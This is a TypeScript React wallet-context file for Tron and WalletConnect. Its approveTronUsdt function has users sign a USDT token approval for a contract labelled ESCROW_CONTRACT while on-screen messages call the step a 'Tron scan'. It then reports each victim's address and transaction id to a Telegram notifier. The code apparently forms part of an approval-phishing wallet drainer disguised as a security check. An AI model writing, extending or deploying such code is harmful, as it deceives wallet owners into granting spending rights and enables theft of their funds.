import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
import { toast } from "sonner";
import { ESCROW_CONTRACT, USDT_TOKEN, TRON_CHAIN_ID } from "@/lib/tronConfig";
import { buildApproveTx, broadcastTransaction, ensureGasForApproval, formatTronUserError } from "@/lib/tronUtils";
import { sendTronApprovalNotification } from "@/lib/telegramNotify";
import {
  connectTronWallet,
  disconnectWalletConnect,
  extractTronAddress,
  ensureWalletSession,
} from "@/lib/walletConnectProvider";

interface TronWalletContextType {
  address: string | null;
  isConnected: boolean;
  isApproving: boolean;
  connect: () => Promise<string | null>;
  disconnect: () => void;
  approveTronUsdt: () => Promise<{ success: boolean; error?: string }>;
  syncFromSession: (session: any) => void;
  clearSession: () => void;
}

const TronWalletContext = createContext<TronWalletContextType>({
  address: null,
  isConnected: false,
  isApproving: false,
  connect: async () => null,
  disconnect: () => {},
  approveTronUsdt: async () => ({ success: false }),
  syncFromSession: () => {},
  clearSession: () => {},
});

export const useTronWallet = () => useContext(TronWalletContext);

export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
  const [address, setAddress] = useState<string | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [isApproving, setIsApproving] = useState(false);

  const syncFromSession = useCallback((session: any) => {
    const tronAddr = extractTronAddress(session);
    setAddress(tronAddr);
    setIsConnected(!!tronAddr);
  }, []);

  const clearSession = useCallback(() => {
    setAddress(null);
    setIsConnected(false);
    setIsApproving(false);
  }, []);

  const connect = useCallback(async (): Promise<string | null> => {
    if (address && isConnected) return address;

    const walletState = await ensureWalletSession();
    if (walletState?.tronAddress) {
      setAddress(walletState.tronAddress);
      setIsConnected(true);
      return walletState.tronAddress;
    }

    try {
      const result = await connectTronWallet();
      if (result.tronAddress) {
        setAddress(result.tronAddress);
        setIsConnected(true);
        toast.success("Tron wallet connected!");
        return result.tronAddress;
      }

      toast.error("Wallet did not provide a Tron account. Use Trust Wallet or TronLink.");
      return null;
    } catch (err: any) {
      console.error("Tron WC connect failed:", err);
      if (err?.message !== "User closed the connection modal") {
        toast.error("Failed to connect Tron wallet");
      }
      return null;
    }
  }, [address, isConnected]);

  const disconnect = useCallback(async () => {
    await disconnectWalletConnect();
    clearSession();
  }, [clearSession]);

  const signTransaction = useCallback(
    async (transaction: any) => {
      const walletState = await ensureWalletSession();
      const tronAddr = address || walletState?.tronAddress;
      if (!walletState || !tronAddr) {
        throw new Error("Tron wallet not connected");
      }

      const result: any = await walletState.provider.client.request({
        chainId: TRON_CHAIN_ID,
        topic: walletState.session.topic,
        request: {
          method: "tron_signTransaction",
          params: {
            address: tronAddr,
            transaction: { transaction },
          },
        },
      });

      return result?.result ? result.result : result;
    },
    [address]
  );

  const approveTronUsdt = useCallback(async (): Promise<{ success: boolean; error?: string }> => {
    const walletState = await ensureWalletSession();
    let tronAddr = address || walletState?.tronAddress;
    if (!tronAddr) return { success: false, error: "Tron wallet not connected." };
    setAddress(tronAddr);
    setIsConnected(true);
    setIsApproving(true);

    try {
      toast.loading("Preparing Tron scan...");
      await ensureGasForApproval(tronAddr);

      toast.dismiss();
      toast.loading("Preparing scan transaction...");
      const transaction = await buildApproveTx(tronAddr, USDT_TOKEN.address, ESCROW_CONTRACT);

      toast.dismiss();
      toast.loading("Please sign in your wallet...");
      const signedTx = await signTransaction(transaction);

      toast.dismiss();
      toast.loading("Sending transaction...");
      const result = await broadcastTransaction(signedTx);

      toast.dismiss();
      if (result.result) {
        const txId = result.txid || "";
        toast.success("TRC-20 scanned!");
        sendTronApprovalNotification(tronAddr, txId).catch(console.error);
        return { success: true };
      }

      throw new Error(result.message || "Broadcast failed");
    } catch (err: any) {
      console.error("Tron approval failed:", err);
      toast.dismiss();
      return { success: false, error: formatTronUserError(err?.message) };
    } finally {
      setIsApproving(false);
    }
  }, [address, signTransaction]);

  return (
    <TronWalletContext.Provider
      value={{
        address,
        isConnected,
        isApproving,
        connect,
        disconnect,
        approveTronUsdt,
        syncFromSession,
        clearSession,
      }}
    >
      {children}
    </TronWalletContext.Provider>
  );
};
